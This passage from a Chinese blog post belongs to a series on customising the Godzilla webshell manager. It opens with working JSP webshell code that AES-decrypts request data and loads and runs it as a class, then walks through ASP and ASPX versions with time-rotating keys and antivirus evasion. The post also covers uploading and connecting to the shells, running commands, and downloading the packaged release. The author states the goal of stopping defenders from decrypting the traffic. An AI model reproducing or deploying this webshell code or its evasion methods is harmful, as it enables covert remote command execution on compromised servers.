<span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span></span>&#123;<span class="keyword">super</span>(z);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;String ret = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="keyword">byte</span>[] value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object decoder = base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance(); value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">try</span>&#123;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] dataa=base64Decode(request.getParameter(pass));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="comment">// Initialize for encryption (1) or decryption (2)</span></span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[] data = c.doFinal(dataa);  <span class="comment">// Encrypt the data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 编码的时间3: &quot; + data + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line"><span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="keyword">null</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);</span><br><span class="line">	java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">	Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">	<span class="comment">//response.getWriter().write(&quot;Base64 编码的时间: &quot; + f + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">	f.equals(arrOut);</span><br><span class="line">	Cipher d = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    d.init(<span class="number">1</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">byte</span>[] data2 = d.doFinal(arrOut.toByteArray());  <span class="comment">// Decrypt the data</span></span><br><span class="line">	<span class="comment">//response.getWriter().write(&quot;Base64 编码的时间: &quot; + arrOut + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">	 String sss=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;eyJtZXNzYWdlIjoi&quot;</span>));</span><br><span class="line">    String ddd=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;In0=&quot;</span>));</span><br><span class="line">	</span><br><span class="line">	f.equals(pageContext);</span><br><span class="line"><span class="comment">//	response.getWriter().write(&quot;Base64 编码的时间: &quot; + pageContext + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">	response.getWriter().write(sss);</span><br><span class="line">	f.toString();</span><br><span class="line">	response.getWriter().write(base64Encode(data2));</span><br><span class="line">	response.getWriter().write(ddd);&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果有大牛感兴趣，可以帮帮我，欢迎留言。</p>
<h5 id="asp-实现动态密钥"><a href="#asp-实现动态密钥" class="headerlink" title="asp 实现动态密钥"></a>asp 实现动态密钥</h5><p>asp和php的差不多，</p>
<p>我们原版的木马中，并不带md5函数，我们要获取md5  进行实时加密么，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Function MD5(text)</span><br><span class="line">    With CreateObject(&quot;MSXML.DOMDocument&quot;).createElement(&quot;a&quot;)</span><br><span class="line">.dataType = &quot;bin.hex&quot;</span><br><span class="line">.nodeTypedvalue = CreateObject(&quot;System.Security.Cryptography.MD5CryptoServiceProvider&quot;).ComputeHash_2(CreateObject(&quot;System.Text.UTF8Encoding&quot;).GetBytes_4(text))</span><br><span class="line">MD5 = .text</span><br><span class="line">        End With</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p>网上找个md5加密，对取到的时间进行md5就可以了，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162516852.png" alt="image-20250110162516852"></p>
<p>就可以获取到key了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162801008.png" alt="image-20250110162801008"></p>
<p>同样的，60分钟的也做好了。</p>
<p>我们配合我们的免杀，一起封装到godzilla里</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162854098.png" alt="image-20250110162854098"></p>
<p>使用的时候，先进行生成</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162932114.png" alt="image-20250110162932114"></p>
<p>一种10min，一种60min的，生成的时候，key不用管，填写了key，也不生效了。</p>
<p>只用填pass，记得设复杂一点。</p>
<p>上传，使用连接即可，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163028486.png" alt="image-20250110163028486"></p>
<p>连接的时候，选择即可。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163102386.png" alt="image-20250110163102386"></p>
<p>进入。执行命令即可。</p>
<p>asp和php的判断是否时间到期有一丢丢区别，就是，如果到时间了，不能用了，不会显示空，而是显示一些乱码，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163246095.png" alt="image-20250110163246095"></p>
<p>没有关系，从新点进入即可。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164330274.png" alt="image-20250110164330274"></p>
<p>当到期后，不会显示null，会显示一个乱码，见上图。就是过期了，从新进入就可以了。</p>
<p>和php一样，当16：49分时就能用一分钟了，需要从新进入了。</p>
<p>好，简单试下免杀，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164643501.png" alt="image-20250110164643501"></p>
<p>其他平台就不试了，应该也没问题。</p>
<p>好，asp就到这里。下面aspx。</p>
<h5 id="aspx-实现动态密钥"><a href="#aspx-实现动态密钥" class="headerlink" title="aspx 实现动态密钥"></a>aspx 实现动态密钥</h5><p>原理都是一样的，改改代码即可。</p>
<p>aspx 实现md5 FormsAuthentication.HashPasswordForStoringInConfigFile(str, “MD5”)</p>
<p>然后获取一下时间，即可，</p>
<p>Response.Write(currentDate.ToString(“yyyy-MM-dd HH:mm:ss”));</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114202059.png" alt="image-20250113114202059"></p>
<p>然后这里，我们将时间进行md5，再然后截取即可。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114400702.png" alt="image-20250113114400702"></p>
<p>大概这样，好，我们先来个十分钟的进行测试一下啊。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114736675.png" alt="image-20250113114736675"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114804784.png" alt="image-20250113114804784"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114830763.png" alt="image-20250113114830763"></p>
<p>使用起来没有问题。当十分钟后，时间到期了</p>
<p>显示的内容和php的一样，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115047127.png" alt="image-20250113115047127"></p>
<p>会什么也不返回。这时候，从新进入既可以了</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115320481.png" alt="image-20250113115320481"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115450558.png" alt="image-20250113115450558"></p>
<p>同样的，给大家准备了，两个时间版本供选择，10min和60min的。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115758077.png" alt="image-20250113115758077"></p>
<p>接下了，将木马封装到godzilla中。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113135939818.png" alt="image-20250113135939818"></p>
<p>生成木🐎</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140037262.png" alt="image-20250113140037262"></p>
<p>两种选择，都加了免杀效果。大家记得使用的时候把pass设置复杂一些，防止上车。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140617749.png" alt="image-20250113140617749"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140429466.png" alt="image-20250113140429466"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140501275.png" alt="image-20250113140501275"></p>
<p>使用都没啥问题。好，asp也写完成了。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对php、jsp、asp、aspx四种语言尝试实现动态密钥，但是遗憾是jsp语言暂未实现。如果有大牛有兴趣可以研究一下。</p>
<p>php、asp、aspx三种语言都实现了，动态密钥生成连接。都为10min和60min两种选择。</p>
<p>php：PHP_XOR_BASE64_MESSAGE_60min、PHP_XOR_BASE64_MESSAGE_10min</p>
<p>asp：ASP_XOR_BASE64_MESSAGE_data10min、ASP_XOR_BASE64_MESSAGE_data60min</p>
<p>aspx：CSHAP_AES_BASE64_DATA_10min、CSHAP_AES_BASE64_DATA_60min</p>
<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>大家可以发现，该版本我写的文章较少，有许多代码都没有详细的写出来，一些时间的获取上，都没有列出来，为的就是大家可以多使用一些时间。所以这个版本笔者先暂不公布代码，下个版本在进行公布在github。</p>
<p>1.2版本实现动态密钥获取，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。还有传递的参数 page=1&amp;size=10 是固定的，让他也动起来，比如Accept-Language、User-Agent这种header头实现动态的 。其他语言的 比如 jspf的 ，asmx的都没做，笔者后面做。</p>
<p><code>这里收集个建议，就是说，我们实现了 10min和60min的换密钥，笔者在测试的时候，其实是可以实现1分钟，或者任意时间换密钥的，就是想问下，需不需要1min这种shell，就是我就不想让蓝队那么快解密，甚至解不出来、但是比较极限，执行两条三条命令就要从新点击进入，有些麻烦，或者其他想法。留言即可。</code></p>
<h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a target="_blank" rel="noopener" href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p>
<p>release 1.0 流量修改版本，src代码也以上传，大家直接下载研究即可。</p>
<p>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。</p>
<p>release 1.2 流量修改+免杀+动态密钥版本，大家直接下载使用即可。</p>
<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            致敬原版哥斯拉</span><br><span class="line">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A   冰蝎v4.0传输协议详解</span><br><span class="line">https://yzddmr6.com/posts/antsword-xor-encoder/   蚁剑实现动态秘钥编码器解码器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>emmm 太菜了<br>一直在路上</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/">https://bohemian.top/2024/12/24/哥斯拉二开v1-0/哥斯拉二开从0到1-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/godzilla/">godzilla</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E5%BC%80/">二开</a><a class="post-meta__tags" href="/tags/%E5%8A%A8%E6%80%81%E5%AF%86%E9%92%A5/">动态密钥</a></div><div class="post-share"><div class="social-share" data-image="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">哥斯拉二开从0到1-2(免杀)</div></div><div class="info-2"><div class="info-item-1">前言有小伙伴提议说，我们上个文章改了一下哥斯拉的流量，但是在实际的应用中，我们打战肯定要先传木马落地，如果不能落地，那么你流量改的再好，其实也没有意义，想想，确实也是。没有第一步上传文件，哪里存在流量呢。 那么这次咱们来做一下免杀。在实际的应用中，似乎我们经常碰到安全设备，奈何咱这也没有啥安全设备，我们就采用常见的厂商的在线杀软吧。如果有小伙伴有的话，可以帮我测测，把结果告诉我，笔者再进行优化。 php...</div></div></div></a><a class="pagination-related" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">哥斯拉二开从0到1-4(流量优化)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a><a class="pagination-related" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-24</div><div class="info-item-2">哥斯拉二开从0到1-5(asmx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。 asmx简介ASMX 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web 服务，允许客户端与服务器进行远程交互，传输数据并执行方法。ASMX 文件通常包含服务的代码和定义，用来处理 Web 服务的请求和响应。 Web 服务（也叫做 XML Web Service）是一种能够接收来自互联网或局域网中其他系统的请求，提供轻量级通信的独立技术。Web 服务通过 SOAP 协议在 Web 上提供功能，通常由 WSDL 文件描述，并通过 UDDI 注册。  SOAP（简单对象访问协议）：它是 XML Web 服务的通信协议，定义了如何通过 HTTP 或其他底层协议来调用 Web 服务中的方法。SOAP 使用 XML 格式的消息进行通信。 WSDL（Web 服务描述语言）：一个 XML 文档，用于描述 Web 服务的操作以及如何交换数据。WSDL 文件通常由软件自动生成，并且可以通过 UDDI...</div></div></div></a><a class="pagination-related" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-22</div><div class="info-item-2">哥斯拉二开从0到1-4(流量优化)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AF%86%E9%92%A5"><span class="toc-number">4.</span> <span class="toc-text">php 实现动态密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jsp-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AF%86%E9%92%A5%EF%BC%88%E6%9A%82%E6%9C%AA%E5%AE%9E%E7%8E%B0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">jsp 实现动态密钥（暂未实现）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asp-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AF%86%E9%92%A5"><span class="toc-number">6.</span> <span class="toc-text">asp 实现动态密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#aspx-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AF%86%E9%92%A5"><span class="toc-number">7.</span> <span class="toc-text">aspx 实现动态密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E7%89%88%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">下个版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">下载、使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">11.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">12.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1">冰蝎二开从0到1</a><time datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" 